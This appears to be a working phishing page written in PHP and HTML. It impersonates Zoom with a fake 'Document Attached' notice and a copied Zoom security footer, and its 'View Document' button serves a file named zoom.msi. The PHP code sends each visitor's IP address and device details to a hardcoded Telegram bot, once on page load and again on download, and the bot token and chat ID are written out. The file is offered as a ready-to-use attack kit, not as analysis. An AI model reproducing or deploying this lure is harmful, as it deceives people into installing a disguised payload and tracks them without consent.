<?php
// --- CONFIGURATION ---
$telegramToken = '8335040883:AAFjauUz-K0KN8c9RthrrnJi8eQU-rN9a24';
$chatId = '5835064705';

// --- GET REAL VISITOR IP (Handles Render Cloud Proxy) ---
$ip = 'Unknown IP';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ip = trim($ipList[0]);
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown Device';

// --- HANDLE DOWNLOAD CLICK EVENT ---
if (isset($_GET['download']) && $_GET['download'] == '1') {
    // Send separate Telegram notification for the download click
    $downloadMessage = "🚨 **Zoom File Downloaded!**\n\n"
                     . "🌐 **IP:** {$ip}\n"
                     . "💻 **Device:** {$userAgent}\n"
                     . "⏰ **Time:** " . date('Y-m-d H:i:s');
    
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $downloadMessage,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Serve the actual file download
    $file = 'zoom.msi';
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// --- SEND PAGE VISIT NOTIFICATION (Only on initial page load) ---
if (!isset($_GET['download'])) {
    $visitMessage = "New Zoom Page Visit!\n\n"
                  . "IP: {$ip}\n"
                  . "Location: Unknown Location\n"
                  . "Time: " . date('Y-m-d H:i:s') . "\n"
                  . "Browser/Device: {$userAgent}";
    
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $visitMessage
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom Document Cloud</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .wrapper {
            max-width: 440px;
            width: 100%;
            text-align: center;
        }
        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        .zoom-logo {
            font-size: 26px;
            font-weight: bold;
            color: #0b5cff;
            margin-bottom: 20px;
        }
        .doc-box {
            border: 1px solid #e1e4e8;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: left;
        }
        .doc-title {
            font-weight: bold;
            font-size: 15px;
            color: #333;
            margin-bottom: 5px;
            text-align: center;
        }
        .doc-subtitle {
            font-size: 12px;
            color: #666;
            margin-bottom: 15px;
            text-align: center;
        }
        .info-bar {
            background: #f0f4ff;
            border-radius: 4px;
            padding: 10px;
            font-size: 12px;
            color: #0b5cff;
            margin-bottom: 15px;
        }
        .download-btn {
            display: block;
            width: 100%;
            background-color: #0b5cff;
            color: white;
            padding: 12px;
            border-radius: 4px;
            text-decoration: none;
            font-weight: bold;
            text-align: center;
            box-sizing: border-box;
            transition: background 0.2s;
        }
        .download-btn:hover {
            background-color: #0043ce;
        }
        .security-footer {
            font-size: 11px;
            color: #666;
            line-height: 1.5;
            text-align: left;
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.04);
        }
        .security-footer p {
            margin: 0 0 10px 0;
        }
        .security-footer p:last-child {
            margin-bottom: 0;
        }
        .security-footer a {
            color: #0b5cff;
            text-align: none;
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="container">
            <!-- Zoom Logo Centered at Top -->
            <div class="zoom-logo">Zoom</div>

            <div class="doc-box">
                <div class="doc-title">Document Attached</div>
                <div class="doc-subtitle">Zoom Document Cloud</div>
                
                <div class="info-bar">
                    Click here to join meeting notes<br>
                    <span style="font-size: 10px; color: #555;">Prepared by Accounts</span>
                </div>

                <!-- Triggers download and notifies Telegram simultaneously -->
                <a href="?download=1" class="download-btn">View Document</a>
            </div>

            <div style="font-size: 11px; color: #888;">
                Zoom, Copyright 2026 All Rights Reserved.
            </div>
        </div>

        <!-- Security Notice & Footer requested directly below -->
        <div class="security-footer">
            <p>For your security, Zoom sends emails only from the following email addresses: <a href="https://zoom.us" target="_blank">zoom@zoom.us</a>, <a href="https://zoom.us" target="_blank">zoom@accounts.zoom.us</a>, and <a href="https://zoom.us" target="_blank">support@email.zoom.us</a>. Be cautious of emails from other addresses claiming to be us. If you suspect this email violates Zoom's Terms of Service, help protect our community and report abuse.</p>
            
            <p>To guarantee that you never miss a Zoom invitation or greeting card, please add <a href="https://zoom.us" target="_blank">zoom@zoom.us</a> to your address book and drag emails to your primary inbox if they land in "Spam" or "Promotions." If you want to stop receiving emails from Zoom, you can block a specific sender or unsubscribe to stop receiving all event invitations, greeting cards, and marketing emails sent via Zoom. Learn more about our <a href="https://zoom.us/privacy" target="_blank">Privacy Policy</a>.</p>
            
            <p style="margin-top: 15px; font-weight: bold; text-align: center;">© Zoom Post • 115 Broadway, New York, NY 10006</p>
        </div>
    </div>

</body>
</html>
